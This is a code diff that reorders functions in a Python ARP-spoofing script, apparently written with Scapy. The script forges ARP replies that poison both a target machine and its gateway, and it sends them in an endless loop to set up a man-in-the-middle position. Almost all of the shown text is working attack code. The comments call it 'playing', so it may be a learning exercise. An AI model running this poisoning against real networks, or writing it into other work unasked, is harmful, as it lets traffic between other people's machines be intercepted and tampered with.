@@ -18,17 +18,7 @@ print(b)
 
 
 
-#####  Playing with an ARP packet. Trying to poison a specified machine  #####
-def impersonateTarget():
-    # Poison the gateway - make it think that it sends the traffic to the target, but instead send it to us;
-    poisonedGateway = ARP()
-    poisonedGateway.op = 2
-    poisonedGateway.psrc = TARGET_IP
-    poisonedGateway.pdst = GATEWAY_IP
-    print('Poisoning gateway ' + str(poisonedGateway.pdst))
-    send(poisonedGateway, verbose=False)
-
-
+#####  Playing with ARPs - poisoning target machine and its gateway #####
 def impersonateGateway():
     poisonedTarget = ARP()
 
@@ -44,6 +34,15 @@ def impersonateGateway():
 
     print('Poisoning target ' + str(poisonedTarget.pdst))
     send(poisonedTarget, verbose=False)
+
+def impersonateTarget():
+    # Poison the gateway - make it think that it sends the traffic to the target, but instead send it to us;
+    poisonedGateway = ARP()
+    poisonedGateway.op = 2
+    poisonedGateway.psrc = TARGET_IP
+    poisonedGateway.pdst = GATEWAY_IP
+    print('Poisoning gateway ' + str(poisonedGateway.pdst))
+    send(poisonedGateway, verbose=False)
 
 while True:
     impersonateGateway()
